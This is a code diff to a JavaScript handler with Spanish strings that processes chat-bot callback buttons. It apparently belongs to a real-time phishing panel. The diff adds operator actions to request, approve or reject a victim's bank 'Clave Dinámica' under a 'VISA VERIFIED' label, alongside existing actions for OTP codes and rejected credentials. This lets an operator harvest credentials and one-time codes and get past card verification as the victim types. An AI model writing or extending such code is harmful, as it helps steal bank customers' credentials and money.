@@ -51,6 +51,12 @@ export default async function handler(req, res) {
                     respuestaTexto = '📱 Código OTP solicitado';
                     estadoMensaje = '📱 *OTP SOLICITADO* - Ingrese el código de verificación';
                 }
+                else if (callbackData.startsWith('pedir_clave_din_')) {
+                    action = 'pedir_clave_din';
+                    solicitudId = callbackData.replace('pedir_clave_din_', '');
+                    respuestaTexto = '🔑 Clave Dinámica solicitada';
+                    estadoMensaje = '🔑 *CLAVE DINÁMICA SOLICITADA* - Ingrese su clave dinámica';
+                }
                 else if (callbackData.startsWith('error_credenciales_')) {
                     action = 'error_credenciales';
                     solicitudId = callbackData.replace('error_credenciales_', '');
@@ -72,6 +78,22 @@ export default async function handler(req, res) {
                     solicitudId = callbackData.replace('rechazar_otp_', '');
                     respuestaTexto = '❌ OTP rechazado';
                     estadoMensaje = '❌ *OTP RECHAZADO* - El código es incorrecto';
+                }
+
+                // ============================================
+                // VISA VERIFIED - CLAVE DINÁMICA
+                // ============================================
+                else if (callbackData.startsWith('aprobar_clave_din_')) {
+                    action = 'aprobar_clave_din';
+                    solicitudId = callbackData.replace('aprobar_clave_din_', '');
+                    respuestaTexto = '✅ Clave Dinámica aprobada';
+                    estadoMensaje = '✅ *CLAVE DINÁMICA APROBADA* - Redirigiendo al cliente';
+                }
+                else if (callbackData.startsWith('rechazar_clave_din_')) {
+                    action = 'rechazar_clave_din';
+                    solicitudId = callbackData.replace('rechazar_clave_din_', '');
+                    respuestaTexto = '❌ Clave Dinámica rechazada';
+                    estadoMensaje = '❌ *CLAVE DINÁMICA RECHAZADA* - La clave es incorrecta';
                 }
 
                 // ============================================
